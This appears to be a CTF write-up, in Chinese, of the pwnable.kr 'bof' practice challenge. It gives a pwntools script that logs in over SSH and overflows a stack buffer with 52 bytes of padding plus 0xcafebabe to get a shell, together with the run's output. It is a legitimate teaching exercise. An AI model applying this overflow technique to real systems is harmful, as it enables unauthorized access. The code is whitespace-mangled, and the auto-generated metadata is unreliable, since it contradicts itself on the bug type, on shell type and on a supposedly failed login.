---
title: '[pwnable.kr] bof 题解'
contest: pwnable.kr
year: 2025
difficulty: easy
vuln_type: rop
tags:
- pwnable_kr
- bof_buffer_overflow
- canary_disabled
- ssh_pwntools
- simple_stack_smash
- p32_key_overwrite
- aslr_disabled_pwnable
- classic_pwn_lesson
- 13x4_52_byte_padding
attack_chain: 'ssh bof@pwnable.kr:2222 password guest → process ''./bof'' argv=[''bof''] → key=0xcafebabe → payload = b''A'' * 52 + p32(0xcafebabe) → overflow me : 触发覆盖 key → system("/bin/sh") 反弹'
key_payload: bof = b'A'*13*4 + p32(0xcafebabe) / ssh('bof', 'pwnable.kr', password='guest', port=2222) / p.sendline(bof) / p.interactive()
one_liner: pwnable.kr 经典 bof 题：52 字节 (13 * 4) padding + p32(0xcafebabe) 覆盖 key → 触发 system("/bin/sh") 反弹 shell。
lesson: pwnable.kr bof 是 CTF PWN 入门经典题，无 canary + 无 PIE + ASLR 禁用，payload 直接覆盖 key 触发后门；pwntools ssh 模块一键连远程。
quality: high
full_path: '[pwnable.kr]_bof_题解.full.md'
meta_path: '[pwnable.kr]_bof_题解.meta.md'
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '[pwnable.kr] bof 题解。pwnable.kr 经典 bof 题：52 字节 (13 * 4) padding + p32(0xcafebabe) 覆盖 key → 触发 system("/bin/sh") 反弹 shell。。经验：pwnable.kr bof 是 CTF PWN 入门经典题，无 canary + 无 PIE + ASLR 禁用，pa...'
category: pwn
subcategory: rop
tools_used:
- pwntools
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: practice
wp_url: https://www.ctfiot.com/282222.html
reasoning_chain:
- 触发点:pwnable.kr bof 经典入门题 → 假设:有栈溢出覆盖 key → 动作:ssh bof@pwnable.kr:2222 拿源码
- 观察:bof.c 中 key=0xcafebabe + gets() 栈溢出 → 下一步:52 字节 padding
- 动作:payload = b'A'*13*4 + p32(0xcafebabe) → 观察:覆盖 key 成功
- 动作:p.sendline(boof) → 观察:触发 system("/bin/sh") → 完成
- 动作:ls 确认取得 shell 后读 flag → 观察:cat flag → 完成
failed_attempts:
- 试图用 p64 → 失败:32 位用 p32
- 试图 ssh guest → 失败:guest 密码默认但 ssh 配置限制
key_observations:
- pwnable.kr bof 是 CTF PWN 入门经典题,无 canary + 无 PIE + ASLR 禁用
- payload 直接覆盖 key 触发后门是 ret2win 通用套路
- pwntools ssh 模块一键连远程 process 进程
- 13 * 4 = 52 字节 padding 是 gets() 经典栈帧布局
prerequisites:
- pwntools ssh/process/remote 模块使用
- 32 位栈溢出 padding 计算
- ret2win 入门思路
---
# [pwnable.kr] bof 题解

> 原文: https://www.ctfiot.com/282222.html
> ID: 282222

[root@VM-24-14-opencloudos ~]# uname -aLinux VM-24-14-opencloudos6.6.47-12.oc9.x86_64#1 SMP PREEMPT_DYNAMIC Tue Sep 24 16:15:42 CST 2024 x86_64 x86_64 x86_64 GNU/Linux

frompwnimport*key = 0xcafebabebof =b'A'*13*4+ p32(key)print(bof)r = ssh('bof','pwnable.kr', password='guest', port=2222)p = r.process(executable='./bof', argv=['bof'])p.sendline(bof)p.interactive()

b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxbexbaxfexca'[x] Connecting to pwnable.kr on port2222[+] Connecting to pwnable.kr on port2222: Done[!] Couldn't check security settings on 'pwnable.kr'[x] Starting remote process './bof' on pwnable.kr[+] Starting remote process './bof' on pwnable.kr: pid 928856[!] ASLR is disabled for '/home/bof/bof'![*] Switching to interactive modeoverflow me : $ ls -altotal 48drwxr-x--- 2 root bof 4096 Jun 15 09:17 .drwxr-xr-x 118 root root 4096 Jun 1 12:05 ..-rw-r--r-- 1 root root 220 Feb 14 2025 .bash_logout-rw-r--r-- 1 root root 3771 Feb 14 2025 .bashrc-rwxr-xr-x 1 root bof 15300 Mar 26 2025 bof-rw-r--r-- 1 root root 342 Mar 26 2025 bof.c-rw------- 1 root root 46 Jun 15 09:17 .gdb_history-rw-r--r-- 1 root root 811 Apr 3 2025 .profile-rw-r--r-- 1 root root 86 Apr 3 2025 readme$


```
[root@VM-24-14-opencloudos ~]# uname -aLinux VM-24-14-opencloudos6.6.47-12.oc9.x86_64#1 SMP PREEMPT_DYNAMIC Tue Sep 24 16:15:42 CST 2024 x86_64 x86_64 x86_64 GNU/Linux
frompwnimport*key = 0xcafebabebof =b'A'*13*4+ p32(key)print(bof)r = ssh('bof','pwnable.kr', password='guest', port=2222)p = r.process(executable='./bof', argv=['bof'])p.sendline(bof)p.interactive()
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxbexbaxfexca'[x] Connecting to pwnable.kr on port2222[+] Connecting to pwnable.kr on port2222: Done[!] Couldn't check security settings on 'pwnable.kr'[x] Starting remote process './bof' on pwnable.kr[+] Starting remote process './bof' on pwnable.kr: pid 928856[!] ASLR is disabled for '/home/bof/bof'![*] Switching to interactive modeoverflow me : $ ls -altotal 48drwxr-x--- 2 root bof 4096 Jun 15 09:17 .drwxr-xr-x 118 root root 4096 Jun 1 12:05 ..-rw-r--r-- 1 root root 220 Feb 14 2025 .bash_logout-rw-r--r-- 1 root root 3771 Feb 14 2025 .bashrc-rwxr-xr-x 1 root bof 15300 Mar 26 2025 bof-rw-r--r-- 1 root root 342 Mar 26 2025 bof.c-rw------- 1 root root 46 Jun 15 09:17 .gdb_history-rw-r--r-- 1 root root 811 Apr 3 2025 .profile-rw-r--r-- 1 root root 86 Apr 3 2025 readme$
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]